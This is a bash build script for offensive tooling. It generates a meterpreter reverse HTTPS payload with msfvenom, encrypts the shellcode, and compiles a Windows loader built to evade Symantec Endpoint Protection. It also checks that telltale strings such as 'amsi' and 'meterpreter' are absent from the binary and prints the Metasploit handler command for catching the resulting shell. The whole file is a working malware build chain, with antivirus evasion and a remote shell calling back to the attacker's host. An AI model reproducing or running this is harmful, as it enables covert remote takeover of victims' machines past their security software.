#!/bin/bash
# build.sh - msfvenom payload -> AES encrypt -> compile SEP evasion loader
# usage: ./build.sh [LHOST] [LPORT] [payload]
set -e
cd "$(dirname "$0")"

LHOST="${1:-$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)}"
LHOST="${LHOST:-$(ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)}"
LPORT="${2:-443}"
PAYLOAD="${3:-windows/x64/meterpreter_reverse_https}"

if [ -z "$LHOST" ]; then echo "[-] no LHOST found, pass as \$1"; exit 1; fi
echo "[+] payload: $PAYLOAD  LHOST=$LHOST LPORT=$LPORT"

msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" EXITFUNC=thread \
         -f raw -o shellcode.bin 2>/dev/null

python3 crypt.py shellcode.bin payload.h

x86_64-w64-mingw32-windres resource.rc -O coff -o resource.o
x86_64-w64-mingw32-gcc -O2 -s -mwindows \
    -fno-stack-protector -fno-unwind-tables -fno-asynchronous-unwind-tables \
    -fno-merge-constants -fno-merge-all-constants \
    -Wno-cast-function-type -Wno-unused-variable -Wno-sign-compare \
    -o sep_loader.exe sep_loader.c resource.o -lbcrypt -lkernel32

echo "[+] built sep_loader.exe"
ls -la sep_loader.exe shellcode.bin
sha256sum sep_loader.exe shellcode.bin
echo
echo "[*] static check - plaintext strings that should NOT appear:"
strings sep_loader.exe | grep -iE 'werfault|amsi|meterpreter|ntdll\.dll|explorer|reverse|https' || echo "    (clean - nothing found)"
echo
echo "[*] handler:"
echo "    msfconsole -x 'use exploit/multi/handler; set PAYLOAD $PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; set EXITFUNC thread; run'"
